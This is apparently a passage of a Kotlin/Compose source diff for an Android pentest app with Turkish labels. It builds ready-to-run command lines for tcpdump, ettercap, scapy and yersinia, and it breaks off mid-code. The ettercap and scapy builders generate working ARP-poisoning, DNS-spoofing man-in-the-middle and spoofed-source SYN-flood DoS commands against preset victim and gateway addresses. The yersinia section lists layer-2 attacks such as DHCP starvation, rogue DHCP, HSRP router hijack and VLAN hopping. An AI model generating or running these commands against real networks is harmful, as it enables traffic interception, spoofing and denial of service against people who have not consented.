+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            listOf("live" to "Canlı Arayüz (-i)", "file" to "PCAP Oku (-r)").forEach { (s, lbl) ->
+                val sel = source == s
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { source = s }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+        if (source == "live") {
+            OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Arayüz (-i: eth0, any, tun0, wlan0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        } else {
+            OutlinedTextField(value = pcapFile, onValueChange = { pcapFile = it }, label = { Text("Okunacak PCAP Dosyası (-r)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "BPF FİLTRE HAZIR ŞABLONLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "tcp port 80 or 443" to "HTTP/HTTPS",
+                "port 53" to "DNS (53)",
+                "icmp" to "ICMP / Ping",
+                "not arp and not icmp" to "No ARP/ICMP",
+                "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0" to "SYN Only",
+                "tcp[tcpflags] & tcp-rst != 0" to "RST Packets",
+                "src net 192.168.1.0/24" to "Subnet",
+                "port 445 or port 139" to "SMB",
+                "tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420" to "HTTP GET"
+            ).forEach { (f, lbl) ->
+                val sel = bpfFilter == f
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { bpfFilter = f }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = bpfFilter, onValueChange = { bpfFilter = it }, label = { Text("Özel BPF Filtre İfadesi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "AYRINTI VE VERİ ÇIKTI MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("none" to "Normal", "-X" to "Hex & ASCII (-X)", "-XX" to "Başlık Dahil (-XX)", "-A" to "Metin (-A)").forEach { (fmt, lbl) ->
+                val sel = payloadFormat == fmt
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { payloadFormat = fmt }.padding(vertical = 5.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "AYRINTI SEVİYESİ (VERBOSITY)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("standard" to "Standart", "-v" to "-v (Detay)", "-vv" to "-vv (Protokol)", "-vvv" to "-vvv (Tam)").forEach { (vb, lbl) ->
+                val sel = verbosity == vb
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { verbosity = vb }.padding(vertical = 5.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "SEÇENEKLER & FİLTRELEME", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        ToggleOption(label = "-nn IP ve Port İsim Çözümlemeyi Kapat (No DNS/Ports)", checked = noDns, onCheckedChange = { noDns = it })
+        ToggleOption(label = "-s 0 Tam Paket Uzunluğu Yakala (Snaplen 0)", checked = snaplenZero, onCheckedChange = { snaplenZero = it })
+        ToggleOption(label = "-tttt İnsan Tarafından Okunabilir Tarih/Saat", checked = timestamp == "-tttt", onCheckedChange = { timestamp = if (it) "-tttt" else "normal" })
+        ToggleOption(label = "-l Satır Tamponlu Çalıştır (Boru Hatları | grep İçin)", checked = lineBuffered, onCheckedChange = { lineBuffered = it })
+        ToggleOption(label = "-q Sessiz Mod (Daha Az Protokol Başlığı)", checked = quiet, onCheckedChange = { quiet = it })
+
+        if (source == "live") {
+            ToggleOption(label = "-c $countLimit Paket Yakala ve Dur", checked = enableCount, onCheckedChange = { enableCount = it })
+            if (enableCount) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = countLimit, onValueChange = { countLimit = it }, label = { Text("Paket Sınırı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+
+            ToggleOption(label = "-w $saveFile PCAP Dosyasına Kaydet", checked = enableSave, onCheckedChange = { enableSave = it })
+            if (enableSave) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = saveFile, onValueChange = { saveFile = it }, label = { Text("Dosya Adı (.pcap)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+                Spacer(modifier = Modifier.height(4.dp))
+                ToggleOption(label = "-C $ringSizeMb MB & -W $ringCount Dosya Boyutuyla Halka Rotasyonu", checked = ringRotate, onCheckedChange = { ringRotate = it })
+            }
+        }
+
+        val parts = mutableListOf("sudo tcpdump")
+        if (source == "live") parts.addAll(listOf("-i", iface)) else parts.addAll(listOf("-r", pcapFile))
+        if (noDns) parts.add("-nn")
+        if (snaplenZero) parts.addAll(listOf("-s", "0"))
+        if (verbosity != "standard") parts.add(verbosity)
+        if (payloadFormat != "none") parts.add(payloadFormat)
+        if (timestamp != "normal") parts.add(timestamp)
+        if (lineBuffered) parts.add("-l")
+        if (quiet) parts.add("-q")
+        if (source == "live") {
+            if (enableCount && countLimit.isNotBlank()) parts.addAll(listOf("-c", countLimit.trim()))
+            if (enableSave && saveFile.isNotBlank()) {
+                parts.addAll(listOf("-w", saveFile.trim()))
+                if (ringRotate) {
+                    parts.addAll(listOf("-C", ringSizeMb, "-W", ringCount))
+                }
+            }
+        }
+        if (bpfFilter.isNotBlank()) parts.add("'${bpfFilter.trim()}'")
+
+        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+    }
+}
+
+// ETTERCAP
+@Composable
+fun EttercapBuilder(language: AppLanguage) {
+    var uiMode by remember { mutableStateOf("-T") }
+    var iface by remember { mutableStateOf("eth0") }
+    var mitmType by remember { mutableStateOf("arp:remote") }
+    var target1 by remember { mutableStateOf("/192.168.1.50//") }
+    var target2 by remember { mutableStateOf("/192.168.1.1//") }
+    var dnsSpoof by remember { mutableStateOf(false) }
+    var repoison by remember { mutableStateOf(true) }
+    var autoadd by remember { mutableStateOf(false) }
+    var filterFile by remember { mutableStateOf("") }
+    var savePcap by remember { mutableStateOf("etter_sniff.pcap") }
+    var enablePcap by remember { mutableStateOf(false) }
+    var logFile by remember { mutableStateOf("") }
+    var quiet by remember { mutableStateOf(false) }
+
+    Column {
+        Text(text = "ÇALIŞTIRMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("-T" to "Metin (-T)", "-C" to "Curses UI (-C)", "-G" to "Grafik GTK (-G)", "-D" to "Daemon (-D)").forEach { (m, lbl) ->
+                val sel = uiMode == m
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { uiMode = m }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (-i: eth0, wlan0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "MITM SALDIRI TÜRÜ (-M)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "arp:remote" to "ARP Poisoning (İki Yönlü)",
+                "arp:oneway" to "ARP Poisoning (Tek Yönlü)",
+                "port" to "Port Stealing (Switch Taşırma)",
+                "dhcp" to "DHCP Spoofing",
+                "icmp" to "ICMP Redirect"
+            ).forEach { (m, lbl) ->
+                val sel = mitmType == m
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mitmType = m }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "HEDEF SEÇİMİ HAZIR ŞABLONLARI (/MAC/IP/IPv6/PORT/)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                ("Kurban & Gateway" to Pair("/192.168.1.50//", "/192.168.1.1//")),
+                ("Tüm Alt Ağ (Subnet)" to Pair("//", "//")),
+                ("Web Trafiği (80/443)" to Pair("//", "//80,443/")),
+                ("Gateway & Belirli Portlar" to Pair("/192.168.1.1//", "//80,443,21,22/"))
+            ).forEach { (lbl, targets) ->
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(SurfaceDark).border(1.dp, BorderDark, RoundedCornerShape(6.dp)).clickable {
+                        target1 = targets.first
+                        target2 = targets.second
+                    }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = CyberGreen) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(6.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            OutlinedTextField(value = target1, onValueChange = { target1 = it }, label = { Text("Hedef 1 (Target 1: Kurban)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            OutlinedTextField(value = target2, onValueChange = { target2 = it }, label = { Text("Hedef 2 (Target 2: Ağ Geçidi)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "EKLENTİLER & SALDIRI MODÜLLERİ (-P)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        ToggleOption(label = "-P dns_spoof Sahte DNS Cevapları Enjekte Et (/etc/ettercap/etter.dns)", checked = dnsSpoof, onCheckedChange = { dnsSpoof = it })
+        ToggleOption(label = "-P repoison_arp ARP Tablolarını Sürekli Zehirle (Anti-Reset)", checked = repoison, onCheckedChange = { repoison = it })
+        ToggleOption(label = "-P autoadd Ağa Katılan Yeni Cihazları Otomatik Hedefe Ekle", checked = autoadd, onCheckedChange = { autoadd = it })
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "KAYIT VE FİLTRELEME", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = filterFile, onValueChange = { filterFile = it }, label = { Text("Derlenmiş Özel Filtre Dosyası (-F dosya.ef)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = logFile, onValueChange = { logFile = it }, label = { Text("Log Dosyası (-L dosya.txt)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        Spacer(modifier = Modifier.height(6.dp))
+        ToggleOption(label = "-w $savePcap Trafiği PCAP Formatında Kaydet", checked = enablePcap, onCheckedChange = { enablePcap = it })
+        if (enablePcap) {
+            Spacer(modifier = Modifier.height(4.dp))
+            OutlinedTextField(value = savePcap, onValueChange = { savePcap = it }, label = { Text("PCAP Kayıt Dosyası") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+        ToggleOption(label = "-q Sessiz Mod", checked = quiet, onCheckedChange = { quiet = it })
+
+        val parts = mutableListOf("sudo ettercap", uiMode, "-i", iface)
+        if (quiet) parts.add("-q")
+        if (mitmType.isNotBlank()) parts.addAll(listOf("-M", mitmType))
+        if (dnsSpoof) parts.addAll(listOf("-P", "dns_spoof"))
+        if (repoison) parts.addAll(listOf("-P", "repoison_arp"))
+        if (autoadd) parts.addAll(listOf("-P", "autoadd"))
+        if (filterFile.isNotBlank()) parts.addAll(listOf("-F", filterFile.trim()))
+        if (logFile.isNotBlank()) parts.addAll(listOf("-L", logFile.trim()))
+        if (enablePcap && savePcap.isNotBlank()) parts.addAll(listOf("-w", savePcap.trim()))
+        if (target1.isNotBlank()) parts.add(target1.trim())
+        if (target2.isNotBlank()) parts.add(target2.trim())
+
+        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+    }
+}
+
+// SCAPY
+@Composable
+fun ScapyBuilder(language: AppLanguage) {
+    var style by remember { mutableStateOf("script") }
+    var scenario by remember { mutableStateOf("syn_scan") }
+    var dstIp by remember { mutableStateOf("192.168.1.100") }
+    var dstPort by remember { mutableStateOf("80") }
+    var srcIp by remember { mutableStateOf("") }
+    var tcpFlags by remember { mutableStateOf("S") }
+    var iface by remember { mutableStateOf("eth0") }
+    var packetCount by remember { mutableStateOf("100") }
+    var interval by remember { mutableStateOf("0.1") }
+    var payload by remember { mutableStateOf("GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n") }
+
+    Column {
+        Text(text = "KULLANIM TARZI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            listOf("script" to "Tek Satır Python Komutu (CLI)", "cli" to "Scapy Etkileşimli Kabuk (Interactive)").forEach { (st, lbl) ->
+                val sel = style == st
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { style = st }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "SALDIRI / PROTOKOL SENARYOSU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "syn_scan" to "TCP SYN Port Tarama",
+                "arp_poison" to "ARP Cache Poisoning",
+                "icmp_ping" to "ICMP Ping Sweep",
+                "dns_query" to "DNS Sorgusu Gönder",
+                "tcp_flood" to "TCP SYN Sel Saldırısı (DoS)",
+                "custom" to "Özel Katman Yığını (/)"
+            ).forEach { (sc, lbl) ->
+                val sel = scenario == sc
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { scenario = sc }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "HEDEF VE AĞ BİLGİLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            OutlinedTextField(value = dstIp, onValueChange = { dstIp = it }, label = { Text("Hedef IP (dst)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            OutlinedTextField(value = dstPort, onValueChange = { dstPort = it }, label = { Text("Hedef Port (dport)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+        Spacer(modifier = Modifier.height(6.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            OutlinedTextField(value = srcIp, onValueChange = { srcIp = it }, label = { Text("Sahte Kaynak IP (Opsiyonel Spoof)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (iface)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "TCP BAYRAKLARI (FLAGS)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("S" to "SYN (S)", "SA" to "SYN-ACK (SA)", "F" to "FIN (F)", "R" to "RST (R)", "PA" to "PUSH-ACK (PA)").forEach { (flg, lbl) ->
+                val sel = tcpFlags == flg
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { tcpFlags = flg }.padding(vertical = 5.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        if (scenario == "tcp_flood" || scenario == "arp_poison") {
+            Spacer(modifier = Modifier.height(8.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                OutlinedTextField(value = packetCount, onValueChange = { packetCount = it }, label = { Text("Paket Adedi (count)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+                OutlinedTextField(value = interval, onValueChange = { interval = it }, label = { Text("Gönderim Aralığı (sn)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+        }
+
+        if (scenario == "custom") {
+            Spacer(modifier = Modifier.height(8.dp))
+            OutlinedTextField(value = payload, onValueChange = { payload = it }, label = { Text("Özel Veri Yükü (Raw Payload)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        val generatedCmd = if (style == "cli") {
+            when (scenario) {
+                "syn_scan" -> "sudo scapy\n>>> res, unans = sr(IP(dst=\"$dstIp\")/TCP(dport=[21,22,80,443],flags=\"$tcpFlags\"), timeout=2)\n>>> res.show()"
+                "arp_poison" -> "sudo scapy\n>>> send(ARP(op=2, pdst=\"$dstIp\", psrc=\"${if (srcIp.isNotBlank()) srcIp else "192.168.1.1"}\"), loop=1, inter=$interval)"
+                "icmp_ping" -> "sudo scapy\n>>> p = sr1(IP(dst=\"$dstIp\")/ICMP(), timeout=2)\n>>> p.show()"
+                "dns_query" -> "sudo scapy\n>>> ans = sr1(IP(dst=\"8.8.8.8\")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=\"$dstIp\")))\n>>> ans[DNS].summary()"
+                "tcp_flood" -> "sudo scapy\n>>> send(IP(src=RandIP(), dst=\"$dstIp\")/TCP(sport=RandShort(), dport=$dstPort, flags=\"$tcpFlags\"), count=$packetCount, inter=$interval)"
+                else -> "sudo scapy\n>>> pkt = IP(dst=\"$dstIp\")/TCP(dport=$dstPort, flags=\"$tcpFlags\")/Raw(load=\"$payload\")\n>>> send(pkt, iface=\"$iface\")"
+            }
+        } else {
+            when (scenario) {
+                "syn_scan" -> "python3 -c \"from scapy.all import *; ans, unans = sr(IP(dst='$dstIp')/TCP(dport=[21,22,80,443,8080],flags='$tcpFlags'), timeout=2, verbose=0); ans.summary(lambda s,r: r.sprintf('{IP:%IP.src%}:{TCP:%TCP.sport%} is %TCP.flags%'))\""
+                "arp_poison" -> "sudo python3 -c \"from scapy.all import *; send(ARP(op=2, pdst='$dstIp', psrc='${if (srcIp.isNotBlank()) srcIp else "192.168.1.1"}'), loop=1, inter=$interval, iface='$iface')\""
+                "icmp_ping" -> "python3 -c \"from scapy.all import *; p = sr1(IP(dst='$dstIp')/ICMP(), timeout=2, verbose=0); print('Host UP: ' + p.src) if p else print('Host DOWN')\""
+                "dns_query" -> "python3 -c \"from scapy.all import *; res = sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='$dstIp')), timeout=2, verbose=0); print(res[DNS].summary()) if res else None\""
+                "tcp_flood" -> "sudo python3 -c \"from scapy.all import *; send(IP(src=RandIP(), dst='$dstIp')/TCP(sport=RandShort(), dport=$dstPort, flags='$tcpFlags'), count=$packetCount, inter=$interval, verbose=1)\""
+                else -> "sudo python3 -c \"from scapy.all import *; pkt = IP(dst='$dstIp')/TCP(dport=$dstPort, flags='$tcpFlags')/Raw(load='$payload'); send(pkt, iface='$iface')\""
+            }
+        }
+
+        GeneratedCommandCard(command = generatedCmd, language = language)
+    }
+}
+
+// YERSINIA
+@Composable
+fun YersiniaBuilder(language: AppLanguage) {
+    var protocol by remember { mutableStateOf("stp") }
+    var execMode by remember { mutableStateOf("cli") }
+    var attackId by remember { mutableStateOf(1) }
+    var iface by remember { mutableStateOf("eth0") }
+    var disableMacSpoof by remember { mutableStateOf(false) }
+    var verbose by remember { mutableStateOf(true) }
+    var logFile by remember { mutableStateOf("") }
+
+    val attacksForProtocol = when (protocol) {
+        "stp" -> listOf(
+            0 to "0: BPDU Flood DoS Saldırısı",
+            1 to "1: Root Bridge Rolünü Ele Geçir (Priority 0)",
+            2 to "2: Topology Change Notification (TCN) Tetikle"
+        )
+        "cdp" -> listOf(
+            0 to "0: Sahte CDP Komşuları Taşır (CAM Tablosu Doldurma)",
+            1 to "1: Sanal CDP Cihazı Kur"
+        )
+        "dtp" -> listOf(
+            0 to "0: Trunk Linkini Müzakere Et (VLAN Hopping Giriş)",
+            1 to "1: DTP Dynamic Desirable Zorla"
+        )
+        "dhcp" -> listOf(
+            0 to "0: DHCP Havuz Tüketimi (Starvation RAW Soket)",
+            1 to "1: Sahte (Rogue) DHCP Sunucusu Başlat"
+        )
+        "hsrp" -> listOf(
+            0 to "0: Aktif Router Rolünü Ele Geçir (Priority 255 Enjeksiyonu)",
+            1 to "1: HSRP Kimlik Doğrulama Kırma"
+        )
+        "dot1q" -> listOf(
+            0 to "0: Çift Etiketli Paket Gönder (Double Tagging)",
+            1 to "1: 802.1Q VLAN Atlama"
+        )
+        else -> listOf(0 to "0: Varsayılan Saldırı")
+    }
+
+    Column {
+        Text(text = "HEDEF KATMAN-2 PROTOKOLÜ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "stp" to "STP (Spanning Tree)",
+                "cdp" to "CDP (Cisco Discovery)",
+                "dtp" to "DTP (VLAN Trunk)",
+                "dhcp" to "DHCP (Starvation/Rogue)",
+                "hsrp" to "HSRP (Router Hijack)",
+                "dot1q" to "802.1Q (Dot1Q)"
+            ).forEach { (p, lbl) ->
+                val sel = protocol == p
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable {
+                        protocol = p
+                        attackId = 0
+                    }.padding(horizontal = 8.dp, vertical = 6.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "ÇALIŞTIRMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("cli" to "Doğrudan Komut Satırı", "-I" to "Curses UI (-I)", "-G" to "Grafik GTK (-G)", "-D" to "Daemon Sunucu (-D)").forEach { (m, lbl) ->
+                val sel = execMode == m
